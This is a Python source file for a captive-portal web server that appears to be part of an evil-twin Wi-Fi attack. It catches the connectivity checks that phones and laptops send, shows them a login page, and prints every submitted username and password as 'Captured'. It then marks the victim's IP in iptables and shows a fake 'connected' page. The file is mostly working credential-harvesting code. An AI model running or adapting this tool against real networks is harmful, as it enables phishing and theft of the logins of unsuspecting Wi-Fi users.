from http.server import BaseHTTPRequestHandler
from pathlib import Path
import mimetypes
import urllib.parse
import json
import subprocess

class CaptivePortalHandler(BaseHTTPRequestHandler):
    ap_iface = None
    
    def log_request(self, code='-', size='-'):
        # Override to suppress BaseHTTPRequestHandler's default logging
        return

    def parse_request(self):
        """Override to handle SSL/TLS handshake data gracefully"""
        try:
            return super().parse_request()
        except Exception as e:
            # Check if this looks like SSL/TLS handshake data
            if hasattr(self, 'raw_requestline'):
                data = self.raw_requestline
                if data and len(data) > 0:
                    # SSL/TLS handshake starts with specific byte sequences
                    if data[0:1] in [b'\x16', b'\x14', b'\x15', b'\x17']:
                        print(f"[SSL] Rejected SSL/TLS handshake from {self.client_address[0]}")
                        try:
                            self.connection.close()
                        except:
                            pass
                        return False
            
            print(f"[!] Parse error from {self.client_address[0]}: {e}")
            return False

    def _add_no_cache_headers(self):
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Expires', '0')

    def _serve_file(self, file_path):
        """Serve a file from the current directory"""
        base_dir = Path(__file__).parent
        file_path = base_dir / file_path.lstrip('/')
        
        if not file_path.exists() or not file_path.is_file():
            return False
            
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
                
            content_type = mimetypes.guess_type(str(file_path))[0] or "application/octet-stream"
            
            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(data)))
            self._add_no_cache_headers()
            self.end_headers()
            self.wfile.write(data)
            return True
        except Exception as e:
            print(f"Error serving {file_path}: {e}")
            return False

    def _serve_login(self):
        """Serve the captive portal login page"""
        base_dir = Path(__file__).parent
        login_page = base_dir / "index.html"
        
        if not login_page.exists():
            print(f"ERROR: Login page not found at {login_page}")
            self.send_error(500, "Portal page missing")
            return
            
        try:
            with open(login_page, 'rb') as f:
                data = f.read()
                
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(data)))
            self._add_no_cache_headers()
            self.end_headers()
            self.wfile.write(data)
        except Exception as e:
            print(f"Error serving login page: {e}")
            self.send_error(500, str(e))

    def do_GET(self):
        client_ip = self.client_address[0]
        path = self.path.split("?", 1)[0]
        host = self.headers.get('Host', '')
        user_agent = self.headers.get('User-Agent', '')
        
        print(f"[GET]  {client_ip} -> {path} (Host: {host})")
        if 'Android' in user_agent:
            print(f"       User-Agent: {user_agent}")
        
        # Simple approach: For ANY captive portal detection request, redirect to portal
        captive_detection_keywords = [
            "connectivitycheck", "generate_204", "gen_204", "ncsi", "captive",
            "hotspot-detect", "clients3.google", "msftconnecttest"
        ]
        
        is_captive_check = any(keyword in host.lower() for keyword in captive_detection_keywords) or \
                          any(keyword in path.lower() for keyword in captive_detection_keywords)
        
        if is_captive_check:
            print("→ Captive portal detection triggered - serving portal page")
            # Instead of redirecting, serve the portal page directly
            self._serve_login()
            return
        
        # Handle specific files (CSS, JS, images)
        if path.endswith(('.html', '.css', '.js', '.png', '.jpg', '.ico')):
            if self._serve_file(path):
                return
        
        # Default: serve login page for any other request
        print("→ Default request - serving captive portal")
        self._serve_login()
    
    def do_POST(self):
        client_ip = self.client_address[0]
        path = self.path
        print(f"[POST] {client_ip} -> {path}")
        
        # Get form data
        length = int(self.headers.get('Content-Length', '0'))
        if length > 0:
            data = self.rfile.read(length).decode('utf-8')
            content_type = self.headers.get('Content-Type', '')
            
            username = ""
            password = ""
            
            try:
                if 'application/x-www-form-urlencoded' in content_type:
                    form_data = urllib.parse.parse_qs(data)
                    username = form_data.get('username', [''])[0]
                    password = form_data.get('password', [''])[0]
                elif 'application/json' in content_type:
                    json_data = json.loads(data)
                    username = json_data.get('username', '')
                    password = json_data.get('password', '')
            except Exception as e:
                print(f"Error parsing form data: {e}")
            
            # Only log if credentials are actually provided
            if username and password:
                print(f"[+] Captured from {client_ip}: user={username} pass={password}")
                
                # Mark client as authenticated
                subprocess.run([
                    "iptables", "-t", "mangle", "-A", "PREROUTING",
                    "-s", client_ip, "-j", "MARK", "--set-mark", "1"
                ], check=False)
                print(f"       Marked {client_ip} as authenticated")
            elif length > 0:
                print(f"[!] Empty form submission from {client_ip} - ignoring")
        
        # Serve success page
        if self._serve_file('success.html'):
            return
            
        # Fallback success message
        success_html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Wi-Fi Connected</title>
            <meta http-equiv="refresh" content="2;url=http://google.com">
        </head>
        <body>
            <h1>Success! You are now connected.</h1>
            <p>Redirecting to the internet...</p>
        </body>
        </html>
        """
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self._add_no_cache_headers()
        self.end_headers()
        self.wfile.write(success_html.encode())
